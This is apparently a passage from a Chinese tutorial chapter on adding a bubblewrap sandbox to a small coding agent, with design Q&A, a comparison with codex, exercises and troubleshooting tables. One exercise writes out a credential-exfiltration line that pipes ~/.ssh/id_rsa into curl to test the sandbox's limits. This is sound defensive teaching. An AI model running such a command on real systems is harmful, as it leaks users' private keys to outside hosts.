**What** — `run_shell` 现在**能够**在 bubblewrap 里跑（只要有人交给它一个沙箱——这一章没有，见 §0.4），Linux only。
新增 `sandbox.py`（模式 → bwrap 命令行）和 `tenancy.py`（`Owner`）。
默认关闭，而且这一章没有提供打开它的开关。

**Why** — 第 5 章的 F05-04 和 F05-05 都是"识别了但拦不住"，
它们自己写着需要一个 OS 沙箱。这是那个沙箱。附带的收益是
`workspace-write` 终于可以名副其实，减掉一批 F05-06 量到的确认框。

**How** — `ShellSession(sandbox=...)`，默认 `None`。
`wrap()` 是纯函数，所以模块本身在任何平台都能测；
真正需要内核的测试用 `needs_bwrap` 守着，reason 写明缺的是 `bwrap` 而不是平台。

**Testing** — 1822 passed（Windows，2 skipped；WSL，0 skipped）。
25/25 变异被抓。`probe_sandbox.py` 六段实测。

**What this does not do** — macOS/Windows 后端、策略语言、按域名的网络规则、
认证和配额（第 23 章）。`setup_failure` 用前缀而不是 `--info-fd`，
已知的边界写在 README 里。

### Code review

> **Q：为什么 `full-access` 不包装？统一走一条路径不是更简单吗？**
>
> 因为那会让 `ps` 说谎。一个所有东西都绑成可写的 bwrap 进程，
> 看起来像有边界，实际没有。**诚实的缺席胜过装饰性的在场**——
> 而且这条有测试盯着（`test_F20_01_full_access_is_not_wrapped_at_all`）。

> **Q：`for_mode` 在 bwrap 缺失的时候为什么不退回 `NoSandbox`？那样更健壮。**
>
> 那是整洁的版本，也是危险的版本：`read-only` 会保住名字、丢掉含义。
> `for_mode` 永远返回真家伙，让 `unavailable()` 说话，由调用方决定这是不是致命的。
> 这条也是 F20-02 的全部内容。

> **Q：`confined` 加在 `judge_command` 的参数上，会不会有调用方忘了传？**
>
> 会，而且那正是设计的默认行为：忘了传的人拿到十九章以来的判断，
> 也就是**更多**的确认框，不是更少。变异测试里有一条专门把默认值改成 `True`，
> 它会让 12 个测试变红。

---

## §14 对照 codex：这一章差在哪里

| | codex | 这里 |
|---|---|---|
| 后端 | seatbelt / seccomp+landlock / Windows 受限令牌（`sandboxing/src/manager.rs:35-40`） | 只有 Linux，其他平台明确拒绝 |
| Linux 机制 | landlock ABI V5（`linux-sandbox/src/landlock.rs:140`）+ seccomp + bwrap | 只有 bwrap |
| bwrap 来源 | 自带二进制，运行时释放（`linux-sandbox/src/bundled_bwrap.rs`） | `shutil.which`，找不到就说 |
| 网络 vs 文件系统 | 两个独立类型（`protocol/src/permissions.rs:78-118`） | **一样，刻意照抄** |
| 策略语言 | Starlark DSL，`prefix_rule` / `network_rule`（`execpolicy/`） | 三个模式，没有 DSL |
| 出网控制 | MITM 代理 + 按域名授权 + 凭据代理（`network-proxy/`，15,000 行） | 开 / 关 |
| 进程加固 | `process-hardening`：禁 core dump、拦 ptrace、清 `LD_PRELOAD` | 无 |

**这一章没有任何一处超出 codex。** 每一个机制都是它的子集。
差距就是右边那一整列。

值得单独说一句：`execpolicy` 那个 Starlark 策略语言，在 OpenAI 自己那里
**还是 preview**，CLI 里是隐藏子命令。所以"没做策略语言"这件事，
和 codex 的距离比表格看起来的近。

---

## 如果你只记住三件事

1. **"允许"是一个判断，不是一条边界。** 第 5 章的判断层写得很好，
   而且它自己写明了做不到什么。分词器把 `python -c "open('x','w')"`
   分类得完全正确，然后什么也没发生。**分类不是强制。**

2. **执行把名字变成机制，而机制需要主人。** 一旦要写下 bind 集合，
   就必须回答"绑哪个目录"，于是"这是谁的目录"第一次成为一个可以问出口的问题——
   而答案是记忆目录没有主人。忠实的移植，在信任模型换掉之后，变成了泄漏。

3. **接线不是机制。** 这一章的两条变异幸存者都在接缝上，都因为
   "能抓住它的测试需要真内核"而在开发机上被跳过。
   bubblewrap 能不能隔离是内核的问题；`shell.run` 有没有去调它是两行 Python 的问题。
   **回答第二个问题不应该需要回答第一个。**

---

## 动手练习

1. **把 `setup_failure` 换成 `--info-fd`。** 现在它靠 `bwrap: ` 前缀，
   一条自己输出以此开头的命令会骗过它。用一根独立的管道拿 bwrap 的状态，
   代价是 `shell.run` 里多一个读取器。先写一个能证明当前实现被骗的测试。

2. **给 `read-only` 加一个可写的临时目录。** 很多工具需要能写
   `/tmp`（`pytest` 的缓存、`pip` 的构建目录）。加一个
   `--bind <tmpdir> /tmp`，然后想清楚：这算不算破坏了 `read-only` 的承诺？
   写下你的理由，再写一个测试把它钉住。

3. **量一下沙箱的开销。** 每条命令多起一个进程和几个命名空间。
   写一段探针，对比 `sandbox=None` 和 `workspace-write` 下跑 100 条
   `echo hi` 的耗时。这个数字会决定沙箱能不能默认开。

4. **让 `Owner` 真的被用起来。** 现在 `tenancy.py` 是一条缝，
   但 `memory.py` / `memory_jobs.py` / `memory_write.py` 还在用模块级常量。
   把它们改成接受一个 `Owner`，保证默认值下所有既有测试不变。
   这是第 23 章的地基。

5. **复现第 19 章和第 20 章共有的那个故障。** 找一个你自己项目里
   "只在某个平台跑得起来"的测试，把它保护的机制删掉，看测试是不是还绿。
   如果是，你就找到了一个同样形状的洞。

6. **把沙箱接上。** 读完第 21 章讲 `connect()` 的 `sandbox=` 参数的那一段再做：在 `__main__._ask` 里，按 `session.mode` 造一个沙箱（`full-access` 不要），检查 `unavailable()`——不可用时你会怎么做？拒绝启动，还是打一行警告然后不加沙箱地跑？——然后设置 `context.shell.sandbox`，并且把 `confined=` 传给审批。`minicodex-live` 的 `__main__` 里有一个做法可以对照。最后写一个测试：从 `main([...])` 出发，证明命令真的被包装了（用 `FakeSandbox`）。

7. **量一下"读"的边界。** 在 `read-only` 加打开网络的配置下，`cat ~/.ssh/id_rsa | curl -d @- ...` 会发生什么？想一想：要挡住它，是该收紧读（比如用 `--tmpfs $HOME` 把家目录盖掉），还是该更严地看管网络？两种做法各会弄坏什么？

---

# 附录 · 对照检查

## T1 · 每段代码是在哪一节写出来的

`src/minicodex/sandbox.py`，从上到下：

| 内容 | 小节 |
|---|---|
| 模块说明、导入、`BWRAP` | §3.2 |
| `_ROOT` 和它上面的注释 | §3.1 |
| `SandboxSpec`（`for_mode`、`writable`） | §4.1（`writable` 的 `full-access`：§4.2） |
| `Sandbox`、`NoSandbox`、`BubblewrapSandbox` | §6.1 |
| `_BWRAP_ERROR_PREFIX` 和注释、`setup_failure` | §5 |
| `for_mode`（模块级的那个） | §10.2 |
| `__all__` | 照着上面所有公开的名字列一遍 |

`src/minicodex/tenancy.py`：全文在 §9。

改动的旧文件：

| 文件 | 改了什么 | 小节 |
|---|---|---|
| `shell.py` | 导入、`__init__` 的 `sandbox` 参数、`wrap` 和 `create_subprocess_exec` 分支 | §10.1 |
| `shell.py` | 退出码非零时先问 `setup_failure` | §5 |
| `policy.py` | `_CONFINED_ALLOWED_BY_MODE`、`judge_command(confined=...)`、`policy_tables` 两项 | §8 |
| `tests/test_approval.py` | 规则表多两项 | §8 |
| `.github/workflows/postmerge.yml` | 第 20 章的变异检查 | §12.1 |

`tests/test_faults_ch20.py`：F20-01 的命令行测试在 §6.1，审批的在 §8；F20-02 在 §10.2；F20-04 在 §4；F20-05 在 §5；F20-06 在 §6；F20-07 在 §7.2；`FakeSandbox` 和接缝测试在 §10.1；F20-08/09 在 §9；改写时加的在 §4.2、§7.2。

## T2 · 常见报错对照表

| 你看到的 | 多半是因为 | 去哪看 |
|---|---|---|
| `'bwrap' is not on PATH, so commands cannot be confined` | 没装 bubblewrap | `sudo apt install bubblewrap`（§0.3） |
| 测试显示 `SKIPPED ... no bwrap on this machine` | 同上；不在 Linux 上也会这样 | §10 |
| `bwrap: execvp /bin/sh: No such file or directory` | bind 集合里没有 shell（"只绑工作区"） | §3 |
| `bwrap: Can't find source path ...` | 用了 `--ro-bind` 绑一个不存在的目录 | §7.2，用 `--ro-bind-try` |
| `bwrap: Can't chdir to ...`，那个目录明明存在 | 它不在命名空间里；或者根本不存在 | §5 |
| 模型拿到 `the sandbox could not be built` | bwrap 自己没起来，不是命令的问题 | §5 |
| `Read-only file system` | 正在 `read-only`，或者写的是工作区外面 | §1.1 |
| `full-access` 关掉网络后什么都写不了 | 改写前的代码 | §4.2 |
| `curl` 在沙箱里连不上 | `--unshare-net`，这是对的；如果开了网也连不上，先看不进沙箱时能不能连上 | §4、§4.3 |
| `probe_sandbox.py net` 全是 not reached | 这台机器本来就连不上那个地址 | 设 `PROBE_URL`（§4.3） |
| 超时之后还有进程在跑 | 没有 `--unshare-pid` | §6 |
| `cat` 能读到 `read_file` 读不到的文件 | 设计如此：沙箱不限制读 | §7.1 |
| `OwnerError: owner key 'Alice' is not usable` | key 只能是小写字母、数字、`-`、`_` | §9.2、§9.3 |
| `minicodex ask` 里的命令没有被关起来 | 这一章没有把沙箱接到命令行上 | §0.4、§10.3 |
| CI 里 `test_F_1_05_every_mutation_script_runs_somewhere` 红了 | 新的变异脚本没进 `postmerge.yml` | §12.1 |
